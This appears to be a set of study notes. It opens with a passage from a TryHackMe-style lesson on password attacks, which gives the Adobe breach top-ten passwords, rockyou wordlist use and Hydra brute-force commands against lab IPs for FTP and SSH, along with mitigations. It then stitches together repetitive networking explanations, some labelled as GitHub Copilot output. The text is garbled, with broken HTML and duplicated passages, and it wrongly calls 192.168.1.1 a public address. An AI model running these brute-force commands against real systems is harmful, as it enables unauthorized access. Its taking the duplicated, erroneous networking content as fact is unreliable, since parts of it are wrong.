<p>Many protocols require you to authenticate. Authentication is proving who you claim to be. When we are using protocols such as POP3, we should not be given access to the mailbox before verifying our identity. The POP3 example from the Protocols and Servers room is repeated below for your convenience. In this example, we are identified as the user frank, and the server authenticated us because we provided the correct password. In other words, the password is one way to authentication.</p>

Authentication, or proving your identity, can be achieved through one of the following, or a combination of two:</p>
<p>Something you know, such as password and PIN code.
Something you have, such as a SIM card, RFID card, and USB dongle.
Something you are, such as fingerprint and iris.
This task will focus on attacks against passwords, i.e. something the target knows. If you revisit the communication with several previous servers using protocols such as Telnet, SSH, POP3, and IMAP, we always need a password to gain access. Based on the 150 million usernames and passwords leaked from the Adobe breach in 2013, the top ten passwords are:</p>
<p>123456
123456789
password
adobe123
12345678
qwerty
1234567
111111
photoshop
123123
Only two passwords are related to Adobe and its products, but the rest are generic. You might think that this has changed over the past decade; however, 123456, 1234567, 12345678, and 123456789 are still common choices for many users. Others haven’t realized yet that qwerty is not secret, and it is used by many as their password.</p>
<p>Attacks against passwords are usually carried out by:</p>
<p>Password Guessing: Guessing a password requires some knowledge of the target, such as their pet’s name and birth year.
Dictionary Attack: This approach expands on password guessing and attempts to include all valid words in a dictionary or a wordlist.
Brute Force Attack: This attack is the most exhaustive and time-consuming where an attacker can go as far as trying all possible character combinations, which grows fast (exponential growth with the number of characters).
Let’s focus on dictionary attacks. Over time, hackers have compiled list after list containing leaked passwords from data breaches. One example is RockYou’s list of breached passwords, which you can find on the AttackBox at /usr/share/wordlists/rockyou.txt. The choice of the word list should depend on your knowledge of the target. For instance, a French user might use a French word instead of an English one. Consequently, a French word list might be more promising.</p>
<p>We want an automated way to try the common passwords or the entries from a word list; here comes THC Hydra. Hydra supports many protocols, including FTP, POP3, IMAP, SMTP, SSH, and all methods related to HTTP. The general command-line syntax is: hydra -l username -P wordlist.txt server service where we specify the following options:</p>
<p>-l username: -l should precede the username, i.e. the login name of the target.
-P wordlist.txt: -P precedes the wordlist.txt file, which is a text file containing the list of passwords you want to try with the provided username.
server is the hostname or IP address of the target server.
service indicates the service which you are trying to launch the dictionary attack.
Consider the following concrete examples:</p>
<p>hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.183.166 ftp will use mark as the username as it iterates over the provided passwords against the FTP server.
hydra -l mark -P /usr/share/wordlists/rockyou.txt ftp://10.10.183.166 is identical to the previous example. 10.10.183.166 ftp is the same as ftp://10.10.183.166.
hydra -l frank -P /usr/share/wordlists/rockyou.txt 10.10.183.166 ssh will use frank as the user name as it tries to login via SSH using the different passwords.
There are some extra optional arguments that you can add:</p>
<p>-s PORT to specify a non-default port for the service in question.
-V or -vV, for verbose, makes Hydra show the username and password combinations that are being tried. This verbosity is very convenient to see the progress, especially if you are still not confident of your command-line syntax.
-t n where n is the number of parallel connections to the target. -t 16 will create 16 threads used to connect to the target.
-d, for debugging, to get more detailed information about what’s going on. The debugging output can save you much frustration; for instance, if Hydra tries to connect to a closed port and timing out, -d will reveal this right away.
Once the password is found, you can issue CTRL-C to end the process. In TryHackMe tasks, we expect any attack to finish within less than five minutes; however, the attack would usually take longer in real-life scenarios. Options for verbosity or debugging can be pretty helpful if you want Hydra to update you about its progress.</p>
<p>In summary, attacks against login systems can be carried out efficiently using a tool, such as THC Hydra combined with a suitable word list. Mitigation against such attacks can be sophisticated and depends on the target system. A few of the approaches include:</p>
<p>Password Policy: Enforces minimum complexity constraints on the passwords set by the user.
Account Lockout: Locks the account after a certain number of failed attempts.
Throttling Authentication Attempts: Delays the response to a login attempt. A couple of seconds of delay is tolerable for someone who knows the password, but they can severely hinder automated tools.
Using CAPTCHA: Requires solving a question difficult for machines. It works well if the login page is via a graphical user interface (GUI). (Note that CAPTCHA stands for Completely Automated Public Turing test to tell Computers and Humans Apart.)
Requiring the use of a public certificate for authentication. This approach works well with SSH, for instance.
Two-Factor Authentication: Ask the user to provide a code available via other means, such as email, smartphone app or SMS.
There are many other approaches that are more sophisticated or might require some established knowledge about the user, such as IP-based geolocation.
Using a combination of the above approaches is an excellent approach to protect against password attacks.</p>
<p>This room covered various protocols, their usage, and how they work under the hood. Three common attacks are:</p>
<p>Sniffing Attack
MITM Attack
Password Attack
For each of the above, we focused both on the attack details and the mitigation steps.</p>
<p>Many other attacks can be conducted against specific servers and protocols. We will provide a list of some related modules.</p>
<p>Vulnerability Research: This module provides more information about vulnerabilities and exploits.
Metasploit: This module trains you on how to use Metasploit to exploit target systems.
Burp Suite: This module teaches you how to use Burp Suite to intercept HTTP traffic and launch attacks related to the web.
It is good to remember the default port number for common protocols. For convenience, the services we covered are listed in the following table sorted by alphabetical order.</p>
<p>Protocol	TCP Port	Application(s)	Data Security
FTP	21	File Transfer	Cleartext
FTPS	990	File Transfer	Encrypted

</ul>
<p><strong>Types of Networks:</strong></p>
<ul>
<li>
<p><strong>Client-Server Networks:</strong> In a client-server network, devices are categorized as clients (requesters) and servers (providers of services). Clients make requests, and servers fulfill them.</p>
</li>
<li>
<p><strong>Peer-to-Peer Networks:</strong> In a peer-to-peer network, all devices have equal status and can act as both clients and servers, sharing resources directly with one another.</p>
</li>
</ul>

<p><strong>Routers:</strong> Routers connect different networks and route data between them. They use IP addresses to make decisions about where data should be sent.</p>
</li>
<li>
<p><strong>Switches:</strong> Switches are used to connect devices within the same network (e.g., within a LAN). They use MAC addresses to forward data to the correct device.</p>
</li>
<li>
<p><strong>Firewalls:</strong> Firewalls are used to protect networks by controlling incoming and outgoing traffic, blocking unauthorized access and threats.</p>
</li>
</ul>
<p><strong>Networking Protocols:</strong></p>

</li>
</ul>
<p>In a rapidly evolving digital world, networking is a fundamental field that continues to shape how we connect, communicate, and share information. Understanding networking principles is crucial for professionals in IT, cybersecurity, and many other technology-related fields.</p>
<p>Networking is the process of connecting computers and other devices to each other so that they can communicate and share resources. Networks can be small, such as a home network with a few computers and a printer, or large, such as the internet which connects billions of devices around the world.</p>
<p>Networks are made up of nodes, which are the devices that are connected to the network, and links, which are the connections between the nodes. Links can be wired, such as Ethernet cables, or wireless, such as Wi-Fi.</p>
<p>Networks are used for a variety of purposes, including:</p>
<ul>
<li>Sharing files and resources, such as printers and scanners.</li>
<li>Accessing the internet.</li>
<li>Communicating with other users, such as through email and instant messaging.</li>
<li>Playing games and other online activities.</li>
</ul>
<p>Networks are essential for many businesses and organizations. They allow employees to communicate and collaborate with each other, and to access resources such as shared files and databases. Networks also allow businesses to connect to the internet and to their customers and suppliers.</p>
<p>GitHub Copilot: The Network Layer is the third layer of the Open Systems Interconnection (OSI) model, which standardizes and conceptualizes the different functions of a communication system into seven distinct categories or layers.</p>
<p>The primary function of the Network Layer is to handle the routing and forwarding of packets. This involves determining the best path for data transfer from the source to the destination. The Network Layer is also responsible for network congestion control, error handling, packet sequencing, and internetworking.</p>
<p>Key components and protocols of the Network Layer include:</p>
<ol>
<li>
<p><strong>IP (Internet Protocol)</strong>: This is the primary protocol used at the Network Layer. It defines the addressing scheme for packets and routes them across networks.</p>
</li>
<li>
<p><strong>ICMP (Internet Control Message Protocol)</strong>: This protocol is used to send error messages and operational information.</p>
</li>
<li>
<p><strong>IGMP (Internet Group Management Protocol)</strong>: This protocol is used by hosts and adjacent routers to establish multicast group memberships.</p>
</li>
<li>
<p><strong>Routers</strong>: These are hardware devices that route packets from one network to another based on their IP addresses.</p>
</li>
<li>
<p><strong>IP Addressing</strong>: This involves assigning unique IP addresses to devices on a network. The IP address is used to identify the source and destination of packets.</p>
</li>
<li>
<p><strong>Subnetting</strong>: This is a technique used to divide a network into smaller, more manageable pieces.</p>
</li>
<li>
<p><strong>Routing Protocols</strong>: These are protocols used by routers to determine the best path for packet delivery. Examples include OSPF (Open Shortest Path First), RIP (Routing Information Protocol), and BGP (Border Gateway Protocol).</p>
</li>
</ol>
<p>The Network Layer plays a crucial role in data communication, enabling data packets to travel across networks and reach their intended destinations.</p>
<p>The network layer is the third layer in the OSI (Open Systems Interconnection) model and the Internet Protocol Suite (TCP/IP model). It plays a critical role in computer networking by providing the necessary functions and services for routing data across networks. The network layer is responsible for packet forwarding, routing, addressing, and logical addressing.</p>
<p>Here are the key functions and characteristics of the network layer:</p>
<ol>
<li>
<p><strong>Packet Forwarding</strong>: The network layer is responsible for forwarding data in the form of packets from the source to the destination across interconnected networks. It encapsulates the data received from the transport layer into packets that can traverse the network.</p>
</li>
<li>
<p><strong>Logical Addressing</strong>: Every device on a network is assigned a unique logical address at the network layer. In the context of the Internet, this logical address is often an IP (Internet Protocol) address. Logical addressing helps identify the source and destination of data packets.</p>
</li>
<li>
<p><strong>Routing</strong>: Routing is the process of determining the best path for data to travel from the source to the destination. Network layer devices, such as routers, use routing algorithms and tables to make decisions about how to forward packets based on the destination address.</p>
</li>
<li>
<p><strong>Packet Switching</strong>: The network layer uses packet switching, a method of data transmission, in which data is broken into smaller packets and sent individually. These packets can take different paths through the network and are reassembled at the destination.</p>
</li>
<li>
<p><strong>Subnetting</strong>: The network layer allows for the division of larger IP address blocks into smaller subnets, which can improve network efficiency and security. Subnetting is a technique that creates smaller, more manageable network segments within a larger network.</p>
</li>
<li>
<p><strong>IP (Internet Protocol)</strong>: IP is the most commonly used protocol at the network layer. It provides a standardized method for addressing and routing data packets across the internet and other networks. IPv4 and IPv6 are two versions of the Internet Protocol.</p>
</li>
<li>
<p><strong>Error Detection and Handling</strong>: The network layer can detect and, in some cases, handle errors in data transmission. For example, it may request retransmission of lost or corrupted packets.</p>
</li>
<li>
<p><strong>Fragmentation and Reassembly</strong>: The network layer can fragment large packets into smaller pieces for transmission over networks with smaller maximum packet sizes. At the destination, these fragments are reassembled into the original packet.</p>
</li>
<li>
<p><strong>Quality of Service (QoS)</strong>: The network layer can support QoS features, which allow for the prioritization of certain types of traffic (e.g., voice or video) to ensure a certain level of service quality.</p>
</li>
<li>
<p><strong>Tunneling</strong>: Tunneling is a technique where the network layer encapsulates one protocol within another for transmission across networks that may not support the inner protocol. For example, IPsec can create VPN tunnels to secure data over the internet.</p>
</li>
<li>
<p><strong>IPv4 and IPv6</strong>: IPv4 (Internet Protocol version 4) and IPv6 (Internet Protocol version 6) are two major versions of the Internet Protocol used at the network layer. IPv4 is the older and more widely used version, while IPv6 was introduced to address the exhaustion of IPv4 addresses and offers improved features.</p>
</li>
</ol>
<p>The network layer is a crucial component of modern networking, enabling devices to communicate with each other across different networks and the internet. It defines the addressing and routing mechanisms that make the global exchange of data possible.</p>
<p>The network layer is the third layer of the Open Systems Interconnection (OSI) model. It is responsible for routing packets between different networks. The network layer uses logical network addresses, such as IP addresses, to identify networks and devices.</p>
<p>The network layer provides the following functions:</p>
<ul>
<li><strong>Routing:</strong> The network layer routes packets between different networks. This is done by using a routing table, which contains a list of networks and their corresponding next hops.</li>
<li><strong>Fragmentation:</strong> The network layer fragments packets that are too large to be transmitted over a particular network.</li>
<li><strong>Reassembly:</strong> The network layer reassembles fragmented packets at the destination.</li>
<li><strong>Error handling:</strong> The network layer detects and handles errors that occur during transmission.</li>
</ul>
<p>Some of the protocols that operate at the network layer include:</p>
<ul>
<li>Internet Protocol (IP): IP is the most common protocol used at the network layer. It is responsible for routing packets between different networks.</li>
<li>Internet Control Message Protocol (ICMP): ICMP is used to send error messages and other control information between devices.</li>
<li>Address Resolution Protocol (ARP): ARP is used to map IP addresses to physical addresses (MAC addresses).</li>
</ul>
<p>The network layer is an essential part of the internet. It allows us to communicate with devices on other networks, regardless of the physical layer that they are using.</p>
<p>Here is an example of how the network layer works:</p>
<p>A user in the United States wants to access a website in Japan. The user's computer sends a packet to the router that is connected to its local network. The router uses its routing table to determine the best path to the destination network. The router then forwards the packet to the next hop in the path.</p>
<p>The packet continues to be forwarded through a series of routers until it reaches the router that is connected to the destination network. The router then forwards the packet to the web server.</p>
<p>The web server receives the packet and sends a response back to the user's computer. The response packet follows the same path back to the user's computer.</p>
<p>The network layer is responsible for routing the packets between the two networks. It also ensures that the packets are fragmented and reassembled correctly, and that any errors are handled.</p>

<li>
<p><strong>Internet Protocol (IP):</strong> IP is the most common protocol used at the network layer. It is responsible for routing packets between different networks.</p>
</li>
<li>
<p><strong>Internet Control Message Protocol (ICMP):</strong> ICMP is used to send error messages and other control information between devices.</p>
</li>
<li>
<p><strong>Address Resolution Protocol (ARP):</strong> ARP is used to map IP addresses to physical addresses (MAC addresses).</p>
</li>
</ul>
<p>The network layer is an essential part of the internet. It allows us to communicate with devices on other networks, regardless of the physical layer that they are using.</p>
<p>Here is an example of how the network layer works:</p>
<p>A user in the United States wants to access a website in Japan. The user's computer sends a packet to the router that is connected to its local network. The router uses its routing table to determine the best path to the destination network. The router then forwards the packet to the next hop in the path.</p>
<p>The packet continues to be forwarded through a series of routers until it reaches the router that is connected to the destination network. The router then forwards the packet to the web server.</p>
<p>The web server receives the packet and sends a response back to the user's computer. The response packet follows the same path back to the user's computer.</p>
<p>The network layer is responsible for routing the packets between the two networks. It also ensures that the packets are fragmented and reassembled correctly, and that any errors are handled.</p>
<p>IPv4 (Internet Protocol version 4) is the fourth version of the Internet Protocol (IP) and is the most widely used protocol on the Internet today. IPv4 addresses are 32-bit numbers that are used to identify devices on the Internet.</p>
<p>IPv4 addresses are typically represented in dotted-decimal notation, which is a four-number format separated by periods. Each number represents a group of 8 bits, or an octet.</p>
<p>For example, the IPv4 address 192.168.1.1 can be broken down into the following four octets:</p>
<ul>
<li>192</li>
<li>168</li>
<li>1</li>
<li>1</li>
</ul>
<p>Each octet can range from 0 to 255, which means that there are over 4 billion possible IPv4 addresses.</p>
<p>IPv4 addresses are assigned to devices by Internet Service Providers (ISPs). When you connect to the Internet, your ISP will assign you an IPv4 address. This address is used to identify your device on the Internet and to allow it to communicate with other devices.</p>
<p>There are two main types of IPv4 addresses:</p>
<ul>
<li><strong>Public IP addresses:</strong> Public IP addresses are addresses that are assigned to devices that are directly connected to the Internet. These addresses are visible to other devices on the Internet and can be used to access devices from the outside world.</li>
<li><strong>Private IP addresses:</strong> Private IP addresses are addresses that are assigned to devices that are connected to a private network, such as a home or office network. Private IP addresses are not visible to other devices on the Internet and cannot be used to access devices from the outside world.</li>
</ul>
<p>Here are some examples of IPv4 addresses:</p>
<ul>
<li>Public IP address: 192.168.1.1</li>
<li>Private IP address: 10.0.0.1</li>
<li>Loopback address: 127.0.0.1</li>
</ul>
<p>The loopback address is a special address that is used to access the local device. It is not visible to other devices on the Internet.</p>
<p>IPv4 is an essential part of the Internet. It allows devices to identify each other and to communicate with each other.</p>
<p>Here is an example of how IPv4 addresses are used:</p>
<p>When you visit a website, your computer sends a packet to the web server that hosts the website. The packet contains your computer's IPv4 address and the IPv4 address of the web server.</p>
<p>The web server receives the packet and sends a response back to your computer. The response packet contains the web server's IPv4 address and your computer's IPv4 address.</p>
<p>Your computer uses the IPv4 address in the response packet to identify the web server and to receive the response.</p>
<p>IPv4 is a reliable and efficient protocol that has been used for decades. However, it is running out of available addresses. To address this issue, the next generation of the Internet Protocol, IPv6, is being deployed. IPv6 uses 128-bit addresses, which provides a much larger pool of addresses.</p>
<p>IPv4 (Internet Protocol version 4) is the fourth version of the Internet Protocol (IP) and is the most widely used protocol on the Internet today. IPv4 addresses are 32-bit numbers that are used to identify devices on the Internet.</p>
<p>IPv4 (Internet Protocol version 4) is the fourth version of the Internet Protocol, which is the addressing and routing system that enables devices to communicate over the internet and other networks. IPv4 uses a 32-bit address format, allowing for approximately 4.3 billion unique IP addresses. Each IPv4 address consists of four octets (groups of 8 bits) separated by periods. The octets are often represented in decimal format, making up a familiar IPv4 address like &quot;192.168.0.1.&quot;</p>
<p>Here's an introduction to IPv4 addresses and examples:</p>
<p><strong>IPv4 Address Format</strong>:</p>
<ul>
<li>IPv4 addresses are composed of 32 bits.</li>
<li>They are typically written in decimal format, where each of the four octets is represented by a decimal number ranging from 0 to 255 (e.g., 192.168.0.1).</li>
</ul>
<p><strong>IPv4 Address Types</strong>:</p>
<ul>
<li><strong>Public IP Address</strong>: These addresses are routable on the public internet and can be used to identify devices or networks globally.</li>
<li><strong>Private IP Address</strong>: These addresses are used within private networks, like home or office networks, and are not routable on the public internet.</li>
<li><strong>Reserved IP Address</strong>: Certain IPv4 address ranges are reserved for specific purposes, such as loopback testing or documentation.</li>
</ul>
<p><strong>Examples of IPv4 Addresses</strong>:</p>
<ol>
<li>
<p><strong>Public IPv4 Address Example</strong>: A public IPv4 address is used to identify a device on the public internet. Here's an example:</p>
<ul>
<li>192.168.0.1 (This is a common private IP address used within local networks.)</li>
</ul>
</li>
<li>
<p><strong>Private IPv4 Address Example</strong>: Private IP addresses are used within local networks and are not directly accessible from the internet. There are three main ranges of private IP addresses:</p>
<ul>
<li>192.168.0.1 (Typically used for local networks in homes or small businesses)</li>
<li>10.0.0.1 (Another range used for private networks)</li>
<li>172.16.0.1 to 172.31.255.254 (A larger range for private networks)</li>
</ul>
</li>
<li>
<p><strong>Reserved IPv4 Address Example</strong>: Certain IPv4 address ranges are reserved for special purposes, such as testing and documentation:</p>
<ul>
<li>127.0.0.1 (This is the loopback address, often used for local testing and troubleshooting. It always refers to the local device.)</li>
<li>0.0.0.0 (This address is used to represent the default network or an invalid, unknown, or non-routed address.)</li>
</ul>
</li>
</ol>
<p>IPv4 addresses are fundamental to the functioning of the internet and local networks. They serve as unique identifiers for devices and help route data between them. However, the limited number of available IPv4 addresses led to the development of IPv6, which uses a 128-bit address format and provides a vastly larger address space to accommodate the growing number of devices connected to the internet. While IPv6 adoption is increasing, IPv4 remains in widespread use, and many networks continue to rely on it alongside IPv6.</p>
<p>GitHub Copilot: IPv4, or Internet Protocol version 4, is the fourth version of the Internet Protocol (IP). It is one of the core protocols of standards-based internetworking methods on the Internet and was the first version deployed for production in ARPANET in 1983. It still routes most Internet traffic today, despite the ongoing deployment of a successor protocol, IPv6.</p>
<p>IPv4 uses 32-bit addresses which limits the address space to 4294967296 (2^32) possible unique addresses. However, many are reserved for special purposes such as private networks (~18 million addresses) or multicast addresses (~270 million addresses). This reduces the number of addresses that can be allocated as public Internet addresses.</p>
<p>IPv4 addresses are typically represented in dot-decimal notation, with four numbers separated by periods, each ranging from 0 to 255, for example, <code>192.168.0.1</code>.</p>
<p>Here are some special types of IPv4 addresses:</p>
<ol>
<li>
<p><strong>Private Addresses</strong>: These are reserved for private networks and are not routable on the public Internet. Examples include <code>192.168.0.1</code>, <code>10.0.0.1</code>, <code>172.16.0.1</code>.</p>
</li>
<li>
<p><strong>Loopback Address</strong>: The address <code>127.0.0.1</code> is reserved for loopback. This means that it is used by the host computer to send a message back to itself for testing network software.</p>
</li>
<li>
<p><strong>Broadcast Address</strong>: This is an address that allows information to be sent to all machines on a given subnet rather than a specific machine. The broadcast address of any IP address can be obtained by taking the bit complement of the subnet mask, and then performing a bitwise OR operation with the IP address itself. For example, for the IP address <code>192.168.0.1</code> with a subnet mask of <code>255.255.255.0</code>, the broadcast address would be <code>192.168.0.255</code>.</p>
</li>
<li>
<p><strong>Multicast Addresses</strong>: These are used to send a single packet to a group of hosts. IPv4 multicast addresses are defined by the leading address bits of <code>1110</code>, originating from the classful network design of the early Internet when this group of addresses was designated as Class D. The CIDR notation for this group is <code>224.0.0.0/4</code>. The group includes the addresses from <code>224.0.0.0</code> to <code>239.255.255.255</code>.</p>
</li>
</ol>
<p>Understanding IPv4 addressing is fundamental to managing and troubleshooting network activities.</p>
<p>GitHub Copilot: Subnetting is a technique that involves dividing a network into two or more smaller networks, known as subnets. It's used to optimize network performance, improve security, and simplify management by structuring network resources into smaller, more manageable parts.</p>
<p>Here are some fundamental concepts related to subnetting:</p>
<ol>
<li>
<p><strong>IP Address</strong>: An IP address is a unique identifier for a device on a network. It's composed of two parts: the network address and the host address.</p>
</li>
<li>
<p><strong>Subnet Mask</strong>: A subnet mask is used to identify the network portion of an IP address. It's a 32-bit number that masks an IP address and divides the IP address into network address and host address.</p>
</li>
<li>
<p><strong>Network Address</strong>: This is the first address in a subnet. All devices within the same subnet share the same network address.</p>
</li>
<li>
<p><strong>Broadcast Address</strong>: This is the last address in a subnet and is used to send data to all devices within the same subnet.</p>
</li>
<li>
<p><strong>Host Addresses</strong>: These are the addresses in a subnet that can be assigned to individual devices.</p>
</li>
</ol>
<p>Here's an example of subnetting:</p>
<p>Let's say you have a network with an IP address of <code>192.168.1.0</code> and a subnet mask of <code>255.255.255.0</code>. This gives you 256 total addresses (<code>192.168.1.0</code> to <code>192.168.1.255</code>), but the first address (<code>192.168.1.0</code>) is reserved for the network address and the last address (<code>192.168.1.255</code>) is reserved for the broadcast address. This leaves you with 254 addresses (<code>192.168.1.1</code> to <code>192.168.1.254</code>) that can be assigned to devices.</p>
<p>If you wanted to divide this network into two subnets, you could change the subnet mask to <code>255.255.255.128</code>. This would give you two subnets: <code>192.168.1.0</code> to <code>192.168.1.127</code> and <code>192.168.1.128</code> to <code>192.168.1.255</code>. Each subnet would have a network address, a broadcast address, and 126 usable host addresses.</p>
<p>Subnetting is a crucial skill for network administrators, as it allows for efficient allocation of IP addresses, reduces network congestion, and improves network security.</p>
<p>Subnetting is a fundamental concept in networking that involves dividing an IP network into smaller, more manageable subnetworks, or subnets. Subnetting is essential for efficient IP address management, network design, and routing. It allows organizations to allocate IP addresses more efficiently and create logical network segments within a larger IP network.</p>
<p>Here are the fundamental concepts of subnetting:</p>
<ol>
<li>
<p><strong>IP Addresses</strong>:</p>
<ul>
<li>IP addresses are numerical labels assigned to devices on an IP network to identify and communicate with them. In IPv4, each address is a 32-bit number written in dotted-decimal format (e.g., 192.168.0.1).</li>
</ul>
</li>
<li>
<p><strong>Network Prefix</strong>:</p>
<ul>
<li>A network prefix (also known as a network address or network ID) is a portion of an IP address that identifies the network to which a device belongs. In an IP address like 192.168.0.1, the network prefix is &quot;192.168.0.&quot;</li>
</ul>
</li>
<li>
<p><strong>Subnet Mask</strong>:</p>
<ul>
<li>A subnet mask is a 32-bit number that divides an IP address into a network prefix and host identifier. It consists of a sequence of consecutive 1s followed by a sequence of consecutive 0s. The 1s in the subnet mask correspond to the network prefix, and the 0s represent the host portion. For example, in the subnet mask 255.255.255.0, the first 24 bits are allocated to the network prefix, and the last 8 bits are for host addresses.</li>
</ul>
</li>
<li>
<p><strong>Subnetting Notation</strong>:</p>
<ul>
<li>Subnetting notation is used to represent the size of a subnet by specifying the number of bits used for the network prefix. It's often expressed as &quot;/X,&quot; where X is the number of bits allocated to the network prefix. For example, &quot;/24&quot; denotes a subnet with a 24-bit network prefix.</li>
</ul>
</li>
<li>
<p><strong>Subnet Size</strong>:</p>
<ul>
<li>Subnet size refers to the number of host addresses within a subnet. The size of a subnet is determined by the number of host bits in the subnet mask. For example, a /24 subnet has 256 (2^8) host addresses, with one reserved for the network address and one for the broadcast address.</li>
</ul>
</li>
<li>
<p><strong>Subnetting Techniques</strong>:</p>
<ul>
<li>Subnetting involves borrowing bits from the host portion of the IP address to create smaller subnets. Common subnetting techniques include Variable Length Subnet Masking (VLSM) and Fixed Length Subnet Masking (FLSM). VLSM allows for subnets of different sizes within the same network, while FLSM uses fixed-size subnets.</li>
</ul>
</li>
<li>
<p><strong>Benefits of Subnetting</strong>:</p>
<ul>
<li>Efficient IP address allocation: Subnetting allows organizations to allocate IP addresses more efficiently and conservatively, reducing IP address wastage.</li>
<li>Network segmentation: Subnetting helps create logical network segments, improving network performance, security, and management.</li>
<li>Routing efficiency: Routers use subnet information to make forwarding decisions, leading to more efficient data routing.</li>
</ul>
</li>
<li>
<p><strong>Subnet Design Considerations</strong>:</p>
<ul>
<li>When designing subnets, consider the number of required subnets, the number of hosts per subnet, and future growth. Choose an appropriate subnet mask and ensure it meets your network's needs.</li>
</ul>
</li>
<li>
<p><strong>Example</strong>:</p>
<ul>
<li>Suppose you have the IP address 192.168.0.0 with a subnet mask of 255.255.255.0 (/24). This subnet allows for 256 host addresses (from 192.168.0.1 to 192.168.0.254) within the network.</li>
</ul>
</li>
</ol>
<p>Subnetting is a fundamental skill for network administrators and engineers. It plays a crucial role in IP address management and network design, enabling efficient and organized networking while conserving IP address resources.</p>
<p>Subnetting is the process of dividing a network into smaller networks, called subnets. This is done by borrowing bits from the host portion of an IP address.</p>
<p>There are two main benefits to subnetting:</p>
<ul>
<li><strong>Efficiency:</strong> Subnetting can improve the efficiency of network traffic by reducing the amount of broadcast traffic on the network.</li>
<li><strong>Security:</strong> Subnetting can improve the security of a network by isolating different subnets from each other.</li>
</ul>
<p>To subnet a network, you need to determine the following:</p>
<ul>
<li>The network address: This is the address of the network itself.</li>
<li>The subnet mask: This is a mask that is used to determine which bits of the IP address are used for the network and which bits are used for the host.</li>
<li>The number of subnets: This is the number of smaller networks that you want to divide your network into.</li>
</ul>
<p>Once you have determined this information, you can use the following steps to subnet your network:</p>
<ol>
<li>Convert the network address and subnet mask to binary.</li>
<li>Borrow the required number of bits from the host portion of the IP address.</li>
<li>Convert the new network address and subnet mask back to decimal.</li>
</ol>
<p>The following table shows an example of how to subnet a network:</p>
<div class="table-wrapper"><table><thead><tr><th>Network Address</th><th>Subnet Mask</th><th>Number of Subnets</th><th>Subnet Addresses</th></tr></thead><tbody>
<tr><td>192.168.1.0</td><td>255.255.255.0</td><td>1</td><td>192.168.1.0 - 192.168.1.255</td></tr>
<tr><td>192.168.1.0</td><td>255.255.255.128</td><td>2</td><td>192.168.1.0 - 192.168.1.127 and 192.168.1.128 - 192.168.1.255</td></tr>
<tr><td>192.168.1.0</td><td>255.255.255.192</td><td>4</td><td>192.168.1.0 - 192.168.1.63, 192.168.1.64 - 192.168.1.127, 192.168.1.128 - 192.168.1.191, and 192.168.1.192 - 192.168.1.255</td></tr>
</tbody></table>
</div>
<p>Once you have subnetted your network, you can assign IP addresses to devices on the subnets.</p>
<p>Subnetting is a complex topic, but it is an essential skill for any network administrator. By understanding subnetting, you can improve the efficiency and security of your networks.</p>
<p>A MAC address, or Media Access Control address, is a unique identifier assigned to a network interface controller (NIC) for use as a network address in communications within a network segment. This use is common in most IEEE 802 networking technologies, including Ethernet, Wi-Fi, and Bluetooth. Within the Open Systems Interconnection (OSI) network model, MAC addresses are used in the medium access control protocol sublayer of the data link layer.</p>
<p>MAC addresses are typically represented as twelve 2-digit hexadecimal numbers, separated by hyphens, colons, or without a separator. For example:</p>
<pre><code>00:0a:95:9d:68:16
</code></pre>
<p>MAC addresses are assigned to NICs by the manufacturer, and are therefore often referred to as the burned-in address, or as an Ethernet hardware address, hardware address, or physical address.</p>
<p>MAC addresses are used to uniquely identify devices on a local network. When a device sends a packet over the network, the MAC address of the destination device is included in the packet header. This allows the router or switch to forward the packet to the correct device.</p>
<p>MAC addresses can also be used to implement security measures on a network. For example, MAC address filtering can be used to prevent unauthorized devices from accessing the network.</p>
<p>Here are some examples of how MAC addresses are used:</p>
<ul>
<li>When you connect your computer to a Wi-Fi network, your computer's MAC address is sent to the router. The router uses this information to authenticate your computer and to assign it an IP address.</li>
<li>When you send a packet to another device on the same network, the MAC address of the destination device is included in the packet header. This allows the router or switch to forward the packet to the correct device.</li>
<li>MAC address filtering can be used to prevent unauthorized devices from accessing the network. For example, you could configure your router to only allow devices with specific MAC addresses to connect to the network.</li>
</ul>
<p>MAC addresses are an important part of networking. By understanding MAC addresses, you can better troubleshoot network problems and improve the security of your network.</p>

<p>GitHub Copilot: A MAC (Media Access Control) address is a unique identifier assigned to a network interface controller (NIC) for use as a network address in communications within a network segment. This use is common in most IEEE 802 networking technologies, including Ethernet, Wi-Fi, and Bluetooth.</p>
<p>A MAC address is a 48-bit number usually represented as six groups of two hexadecimal digits separated by colons or hyphens, for example, <code>01:23:45:67:89:AB</code>.</p>
<p>Here are some key points about MAC addresses:</p>
<ol>
<li>
<p><strong>Uniqueness</strong>: Each MAC address is unique to the network interface it's assigned to. This is due to the IEEE's management of the assignment of MAC addresses to manufacturers to ensure uniqueness.</p>
</li>
<li>
<p><strong>Hardware-Based</strong>: MAC addresses are typically assigned by the manufacturer of the network interface card and are stored in its hardware, specifically its read-only memory, or some other firmware mechanism.</p>
</li>
<li>
<p><strong>Used in LAN</strong>: MAC addresses are primarily used in Local Area Networks (LANs) for uniquely identifying devices on the network at the data link layer (Layer 2) of the OSI model.</p>
</li>
<li>
<p><strong>MAC vs IP</strong>: While both MAC and IP addresses are used to facilitate communication on a network, they operate at different layers of the OSI model. An IP address can change depending on the network a device connects to, but a MAC address is typically fixed and stays with the device as a unique identifier.</p>
</li>
<li>
<p><strong>MAC Address Filtering</strong>: MAC addresses can be used to secure a network through MAC address filtering. Only devices with MAC addresses configured in the network's access control list are allowed to connect.</p>
</li>
<li>
<p><strong>Privacy Concerns</strong>: Because MAC addresses are unique and persistent, they can be used to track devices—and, by extension, their users. Some operating systems offer a feature called MAC address randomization to protect user privacy. This feature uses a different, random MAC address each time the device connects to a new network.</p>
</li>
</ol>
<p>A MAC (Media Access Control) address, also known as a hardware address or physical address, is a unique identifier assigned to network interfaces, such as network interface cards (NICs) in computers, network devices, and networked appliances. MAC addresses are used at the data link layer of the OSI model to identify and communicate with devices within a local network, such as an Ethernet network.</p>
<p>Key characteristics of MAC addresses:</p>
<ol>
<li>
<p><strong>Uniqueness</strong>: Every MAC address is expected to be globally unique. This uniqueness is achieved by device manufacturers who assign MAC addresses to their network interfaces during production. The IEEE (Institute of Electrical and Electronics Engineers) manages the assignment of MAC address prefixes to manufacturers, ensuring that no two devices from different manufacturers have the same MAC address.</p>
</li>
<li>
<p><strong>Address Format</strong>: A MAC address is a 48-bit (6-byte) value, typically represented in hexadecimal format. It consists of six pairs of hexadecimal digits separated by colons or hyphens, like &quot;00:1A:2B:3C:4D:5E.&quot;</p>
</li>
<li>
<p><strong>Role in Local Networks</strong>: MAC addresses are used to identify devices on the same local network segment. When a device needs to communicate with another device on the same network, it uses the MAC address to address data packets to the specific target device.</p>
</li>
